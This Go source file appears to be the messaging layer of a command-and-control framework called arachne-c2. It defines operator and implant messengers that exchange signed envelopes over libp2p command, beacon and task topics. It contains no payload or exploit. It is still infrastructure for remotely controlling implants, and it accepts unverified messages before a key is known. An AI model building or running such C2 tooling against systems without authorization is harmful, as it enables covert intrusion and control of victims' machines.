package transport

import (
	"context"
	"fmt"
	"sync"
	"time"

	"google.golang.org/protobuf/proto"

	"github.com/libp2p/go-libp2p/core/crypto"

	arachnepb "github.com/anomalyco/arachne-c2/protobuf/arachnepb"
	"github.com/anomalyco/arachne-c2/pkg/cryptography"
)

// ErrSignatureInvalid is returned when envelope signature verification fails.
var ErrSignatureInvalid = fmt.Errorf("signature invalid")

type MessageHandler func(ctx context.Context, envelope *arachnepb.Envelope, fromPubKey crypto.PubKey)

type Messenger struct {
	node    *Node
	handler MessageHandler
	privKey crypto.PrivKey

	// Trusted public key for verifying inbound messages.
	// Operator side: set after first verified registration per implant.
	// Implant side: set at startup (operator's public key embedded in binary).
	trustedPubKey crypto.PubKey

	// Known implant public keys (operator side, keyed by peer ID string).
	knownImplants map[string]crypto.PubKey

	mu sync.RWMutex
}

func NewOperatorMessenger(ctx context.Context, node *Node, keys *cryptography.OperatorKey) *Messenger {
	return &Messenger{
		node:          node,
		privKey:       keys.PrivateKey,
		knownImplants: make(map[string]crypto.PubKey),
	}
}

func NewImplantMessenger(ctx context.Context, node *Node, keys *cryptography.ImplantKey, operatorPub crypto.PubKey) *Messenger {
	return &Messenger{
		node:          node,
		privKey:       keys.PrivateKey,
		trustedPubKey: operatorPub,
		knownImplants: make(map[string]crypto.PubKey),
	}
}

func (m *Messenger) SetHandler(handler MessageHandler) {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.handler = handler
}

func (m *Messenger) SetTrustedPubKey(pub crypto.PubKey) {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.trustedPubKey = pub
}

func (m *Messenger) AddKnownImplant(peerID string, pub crypto.PubKey) {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.knownImplants[peerID] = pub
}

func (m *Messenger) KnownImplant(peerID string) crypto.PubKey {
	m.mu.RLock()
	defer m.mu.RUnlock()
	return m.knownImplants[peerID]
}

func (m *Messenger) CommandTopic() string {
	return CommandTopicPrefix + m.node.ID().String()
}

func (m *Messenger) BeaconTopic() string {
	return BeaconTopicPrefix + m.node.ID().String()
}

func (m *Messenger) TaskTopic(implantPeerID string) string {
	return TaskTopicPrefix + implantPeerID
}

// VerifyEnvelope checks the signature on an envelope against the provided public key.
// Returns the parsed public key on success.
func VerifyEnvelope(env *arachnepb.Envelope, trustedPub crypto.PubKey) error {
	if trustedPub == nil {
		return fmt.Errorf("no trusted public key configured")
	}
	if len(env.Signature) == 0 {
		return fmt.Errorf("%w: missing signature", ErrSignatureInvalid)
	}
	ok, err := cryptography.Verify(trustedPub, env.Data, env.Signature)
	if err != nil {
		return fmt.Errorf("verify: %w", err)
	}
	if !ok {
		return ErrSignatureInvalid
	}
	return nil
}

// PubKeyFromEnvelope extracts the sender's public key from the envelope's SenderKey field.
func PubKeyFromEnvelope(env *arachnepb.Envelope) (crypto.PubKey, error) {
	if len(env.SenderKey) == 0 {
		return nil, fmt.Errorf("no sender key in envelope")
	}
	return cryptography.PubKeyFromBytes(env.SenderKey)
}

// ListenVerified subscribes to a topic and only delivers messages whose signatures
// verify against the trusted public key.
func (m *Messenger) listenVerified(ctx context.Context, topic string, getTrusted func() crypto.PubKey) error {
	sub, err := m.node.Subscribe(topic)
	if err != nil {
		return fmt.Errorf("subscribe %s: %w", topic, err)
	}
	go func() {
		for {
			msg, err := sub.Next(ctx)
			if err != nil {
				return
			}
			env := &arachnepb.Envelope{}
			if err := proto.Unmarshal(msg.Data, env); err != nil {
				continue
			}

			trusted := getTrusted()
			if trusted == nil {
				// Before we know the implant's key (first registration), we
				// accept the envelope and let the handler validate identity.
				m.deliver(ctx, env)
				continue
			}

			if err := VerifyEnvelope(env, trusted); err != nil {
				continue
			}
			m.deliver(ctx, env)
		}
	}()
	return nil
}

func (m *Messenger) ListenBeacons(ctx context.Context) error {
	return m.listenVerified(ctx, m.BeaconTopic(), func() crypto.PubKey {
		// The operator may have 0-to-many implants, each with its own key.
		// Verification is done per-implant in the handler, not globally.
		return nil
	})
}

func (m *Messenger) ListenCommands(ctx context.Context) error {
	return m.listenVerified(ctx, m.CommandTopic(), func() crypto.PubKey {
		m.mu.RLock()
		defer m.mu.RUnlock()
		return m.trustedPubKey
	})
}

func (m *Messenger) deliver(ctx context.Context, env *arachnepb.Envelope) {
	m.mu.RLock()
	handler := m.handler
	m.mu.RUnlock()
	if handler == nil {
		return
	}
	var pubKey crypto.PubKey
	if len(env.SenderKey) > 0 {
		pubKey, _ = PubKeyFromEnvelope(env)
	}
	handler(ctx, env, pubKey)
}

func (m *Messenger) SendEnvelope(ctx context.Context, topic string, env *arachnepb.Envelope) error {
	data, err := proto.Marshal(env)
	if err != nil {
		return fmt.Errorf("marshal envelope: %w", err)
	}
	return m.node.Publish(ctx, topic, data)
}

// SignAndSend signs the envelope data, attaches signature + sender key, then publishes.
func (m *Messenger) SignAndSend(ctx context.Context, topic string, env *arachnepb.Envelope) error {
	if m.privKey == nil {
		return fmt.Errorf("no private key for signing")
	}
	sig, err := cryptography.Sign(m.privKey, env.Data)
	if err != nil {
		return fmt.Errorf("sign: %w", err)
	}
	env.Signature = sig

	pubBytes, err := m.privKey.GetPublic().Raw()
	if err == nil {
		env.SenderKey = pubBytes
	}
	return m.SendEnvelope(ctx, topic, env)
}

func (m *Messenger) CreateEnvelope(msgType uint32, data []byte) *arachnepb.Envelope {
	return &arachnepb.Envelope{
		ID:   time.Now().UnixNano(),
		Type: msgType,
		Data: data,
	}
}
